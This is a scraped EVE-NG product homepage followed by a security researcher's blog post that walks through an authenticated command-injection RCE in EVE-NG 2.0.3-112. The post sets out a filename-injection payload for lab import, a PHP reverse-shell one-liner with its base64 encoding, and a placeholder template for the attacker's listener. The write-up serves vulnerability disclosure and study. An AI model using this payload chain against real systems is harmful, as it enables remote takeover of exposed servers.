=== Content from eve-ng.com_1b5c5b21_20250114_190049.html ===

 [Skip to content](#main "Skip to content")

* [Home](https://www.eve-ng.net/)
* [Download](https://www.eve-ng.net/index.php/download/)
* [Features](https://www.eve-ng.net/index.php/features/)
* [Documentation](https://www.eve-ng.net/index.php/documentation/)
* [FAQ](https://www.eve-ng.net/index.php/faq/)
* [Buy](https://www.eve-ng.net/index.php/buy/)
* [Community](https://www.eve-ng.net/index.php/community/)
* [Labs Library](https://www.eve-ng.net/index.php/lab-library/)
* [Forum](/forum)
* [Live Helpdesk](https://webchat.eve-ng.net/)
* [Donate](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=A5CDRWUBKWT8A)
* Search
  Search for:

  Search

[![](https://www.eve-ng.net/wp-content/uploads/2019/11/Logo_EVE_Color-1-e1573260071537.png)](https://www.eve-ng.net/)
#

* [Home](https://www.eve-ng.net/)
* [Download](https://www.eve-ng.net/index.php/download/)
* [Features](https://www.eve-ng.net/index.php/features/)
* [Documentation](https://www.eve-ng.net/index.php/documentation/)
* [FAQ](https://www.eve-ng.net/index.php/faq/)
* [Buy](https://www.eve-ng.net/index.php/buy/)
* [Community](https://www.eve-ng.net/index.php/community/)
* [Labs Library](https://www.eve-ng.net/index.php/lab-library/)
* [Forum](/forum)
* [Live Helpdesk](https://webchat.eve-ng.net/)
* [Donate](https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=A5CDRWUBKWT8A)
* Search
  Search for:

  Search

## Home

EVE - The Emulated Virtual Environment
For Network, Security and DevOps
Professionals

Just choose your version and download
[Download Now](/index.php/download/)
EVE - The Emulated Virtual Environment
For Network, Security and DevOps
Professionals

Just choose your version and download
[Download Now](/index.php/download/)
EVE - The Emulated Virtual Environment
For Network, Security and DevOps
Professionals

Just choose your version and download
[Download Now](/index.php/download/)
EVE - The Emulated Virtual Environment
For Network, Security and DevOps
Professionals

Just choose your version and download
[Download Now](/index.php/download/)
EVE - The Emulated Virtual Environment
For Network, Security and DevOps
Professionals

Just choose your version and download
[Download Now](/index.php/download/)

![previous arrow](data:image/svg+xml;base64...)
![next arrow](data:image/svg+xml;base64...)

![Slider](data:image/svg+xml;base64...)

### *EVE-NG Professional Edition Latest Now: Release 6**.2.0-20, 25 November, 2024*

![](https://51.89.118.57/wp-content/uploads/2019/11/Union.png)

EVE-NG PRO platform is ready for today’s IT-world requirements. It allows enterprises, e-learning providers/centers, individuals and group collaborators to create virtual proof of concepts, solutions and training environments.

EVE-NG PRO is the first clientless multivendor network emulation software that empowers network and security professionals with huge opportunities in the networking world. Clientless management options will allow EVE-NG PRO to be as the best choice for Enterprise engineers without influence of corporate security policies as it can be run in a completely isolated environment.

![](https://www.eve-ng.net/wp-content/uploads/2019/11/Screenshot-2019-11-14-at-13.25.02-e1593123597917.png)

| EVE Professional Edition:  *6.2.0-20 EVE-NG Professional (25 November 2024)*  [*Release notes link*](https://www.eve-ng.net/index.php/documentation/release-notes/) |
| --- |
| [Download EVE Professional](https://www.eve-ng.net/index.php/download/) ***Upgrade notes:***  ***To upgrade EVE PRO or EVE LC please follow the link below:***  [EVE PE Professional Edition upgrade from V5.X to vers V6.X](https://www.eve-ng.net/index.php/1845-2/eve-pro-upgrade-from-v5-x-to-v6-x/)  [*EVE PE Professional Edition V6 update to the latest version*](https://www.eve-ng.net/index.php/1845-2/)  [*Live Helpdesk*](https://webchat.eve-ng.net/login/) |

| EVE-NG Professional/Learning Center Cookbook |
| --- |
| ***EVE-NG PRO/LC Cookbook version 6.8 (30 MAY, 2024)*** *[Download link EVE PRO/LC Cookbook](https://www.eve-ng.net/index.php/documentation/professional-cookbook/)***Section updates in v 6.8**   * Chapter 3.Installation BM * Chapter 7.8.4 Lab Global settings, cable thickness, Topology grid on/off * Chapter 8.1.5, Link style thickness |

| **Some Features:**  EVE brings You the power You need to mastering your network within multivendor environment designing and testing.     * KVM HW accelaration * Topology designer “click and play” * Import/export configuration * Labs xml file format * Picture import and maps “click and play” * Custom Kernel support for L2 protocols * Memory optimization ( UKSM ) * CPU Watchdog * Full HTML5 User Interface * Ability to use without additionnals tools * Multiusers * Interaction with real network fully supported * Simultaneous lab instances * Derivated  from Ubuntu LTS 20.04 server for long term support |
| --- |

| **EVE-NG-PRO Emulation Software**  | *The brand new structure is created with many updated features and improvements.*  * Dynamic console porting, no limits, fixing issues for multi user consoling, Telnet porting choose is random * Hot links, interconnection running nodes, ports immediately response, shut no shut, Ethernet only * 1024 nodes support per lab * Docker containers support * HTML desktop console to EVE management, clientless EVE management * Closing feature of running lab placing it to running folder, option run more than one lab simultaneously * Import/export configs for eve lab to/from local PC * Multiuser support, Administrator role only * EVE User account access time limitation * NAT cloud, integrated NAT option with DHCP on the EVE * Integrated Wireshark capture using docker, ethernet only * Multi configurations for single lab * Lab design features, links and objects * Custom template for own node deployment * Lab timer for self-training * EVE Labs control management * Information display of running labs and nodes per user. Admin control of processes * Link quality bandwidth, delay, jitter and loss set feature * EVE Cluster * Google Cloud EVE PRO support | *Upcoming features in EVE-NG PRO:*  * Current version display and the newest available * New lab design options * Live lab resource widget, CPU, RAM * Lab timer, countdown improvement | | --- | --- | |
| --- | --- | --- |

Back to Top

|  |![ipv6 ready](https://ipv6-test.com/button-ipv6-small.png "ipv6 ready") **EVE-NG hosting partners. Rent EVE server online.** [**Visit Cloud My Lab for offer detail**](https://cloudmylab.com/services/hosted-emulators/eve-ng) Official partnership. Solution tested and approved by EVE-NG Ltd |
| --- | --- |

| © EVE-NG Ltd 2024 |
| --- |
| info@eve-ng.net |
| Company Number 10152731 |
| London, United Kingdom |



=== Content from erpaciocco.github.io_c64f78b8_20250114_190050.html ===


Toggle navigation Menu

[ErPaciocco](/)

* [Home](/)
* [Portfolio](/#portfolio)
* [Advisories](/#advisories)
* [Blog](/blog/)
* [Whoami](/#whoami)
* [Contact me](/#contact)

# A deep dive into EVE-NG Remote Command Execution

## PHP Filter bypass & RCE

Posted by ErPaciocco on October 18, 2022

---

---

Hi all!
A few months ago, during an activity, I tested an exposed EVE-NG instance.
Immediately I thought:

**“I am going to find a critical vulnerability in EVE-NG!”**

I started the analysis and, a few days later, I reached my mission: now I’m gonna explain you
all of my process, from recon to RCE, in:

> EVE-NG 2.0.3-112 (community)

*Let’s goo!*

### Phase 1: Inspecting Source Code

From [EVE-NG Website](https://www.eve-ng.net/index.php/download/) I downloaded the 2.0.3-112 Community version OVF.
It was locally available at [192.168.1.26](http://192.168.1.26).

I started the source code analysis by finding potentially dangerous functions like `exec`, `passthru`, `include`
and so on.
After typing `exec` in search bar I found this:

| Results of 'exec' string |
| --- |
| *Results of ‘exec’ string* |

Looking at results page, I realized it could have been so funny because there were a lot of `exec` references which imply input data to check and validate.
I decided to investigate more in depth on *api\_labs.php*: it exposes an API to manage labs functions.

| api_labs.php |
| --- |
| *api\_labs.php* |

A quick sight to these functions gave me a hint on which ones I should focus on:

* Import Lab
* Export Lab

*Other ones were more sanitized/hard to exploit or they weren’t “highly related” to a potential RCE.*

```

| Function          | Possible Exploit       | Motivation (lines)                               |
| ------------------| -----------------------| -------------------------------------------------|
| apiCloneLab       | Path Traversal         | api_labs.php: `107`, `117`                       |
| apiDeleteLab      | RCE                    | Possible RCE but hard to exploit (input filters) |
| apiImportLabs     | RCE                    | Possible chained RCE                             |
| apiExportLabs     | RCE                    | Possible chained RCE                             |

```
### Phase 2: Exploit Theory

A deeper inspection led me to this plan:

1. Import zipped LAB with a payload inside filename
2. Export the same LAB, thus triggering command execution

> Even if in other API calls UNL filename is checked and verified, in Import LAB feature (ZIP file) there isn’t a check on `file` parameter:

Function *apiImportLabs* : `html\includes\api_labs.php`

| apiImportLabs function |
| --- |
| *apiImportLabs function* |

The absence of this check makes possible to inject arbitrary filenames in UNL files:
in Linux almost all characters are permitted inside filename, so it’s fantastic. I only had to end filename with *“.unl”*.

In Export LAB feature there is a check to validate the existence of the file. If the file exists, the filename is passed to exec (parameter we control is `$relement`):

Function *apiExportLabs* : `html\includes\api_labs.php`

| apiExportLabs function |
| --- |
| *apiExportLabs function* |

> **NOTE**: Considering that path delimiters in Linux are forward slashes (/) while I was in Windows environment, I had to inject a payload that didn’t contain such characters (/, : in Windows also \ is path delimiter). I opted to inject as zip argument a bash command.

### Phase 3: PoC

1) **Login as Admin**

* To exploit this vulnerability, we must have enough privileges to create a new Lab.
  **Admin** user is the only role available in this version, so if you have an account on eve-ng, it will surely be an Administrator.

| Login page |
| --- |
| *Login page* |

2) **Import a new LAB**

Once in */#/main* you must prepare the payload.
Craft a payload as shown in steps below:

* Create a ZIP file with a simple UNL file
* Open ZIP file and rename it following these rules:
  + The filename must end with “.unl”
  + Filename must not contain these characters: / \ “ ‘
    Considering these limitations and that we must inject bash commands, final payload will be like:

> `$(eval $(echo BASE64DATA| base64 --decode)).unl`

The best thing we can do in this case is build a reverse shell. Payload is base64 encoded, so we need to base64 encode a reverse shell payload. In my case it has been:

> `php -r '$sock=fsockopen("192.168.1.22",5555);exec("/bin/sh -i <&3 >&3 2>&3");'`

* Base64-encoded:

> `cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguMS4yMiIsNTU1NSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn`

But you must change it in the following format:

> `php -r '$sock=fsockopen("YOUR_LISTENING_IP",YOUR_LISTENING_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`

3) **Upload malicious ZIP file as new Lab**

| Malicious ZIP |
| --- |
| *Malicious ZIP* |

4) **Export LAB**

In this final stage you must export the malicious Lab you’ve just created. Shell commands inside the UNL name will be executed. In case of reverse shell, be sure you are listening on IP and port set in malicious filename.

| Netcat listening |
| --- |
| *Netcat listening* |

| Export LAB |
| --- |
| *Export LAB* |

| Reverse Shell |
| --- |
| *Reverse Shell* |

**STAY TUNED!**

---

* [← Previous Post](/2022/an-alternative-approach-to-htb-hunting/ "An alternative approach to HTB hunting")
* [Next Post →](/2023/uncovering-altchunk-dangers/ "Uncovering the dark magic of altChunk")

---

## I new mates!

* [![](/assets/img/instagram-badge.png)](https://instagram.com/erpaciocco)

© 2024 - ErPaciocco (Theme by [Antonio Trento](https://antoniotrento.net/) )


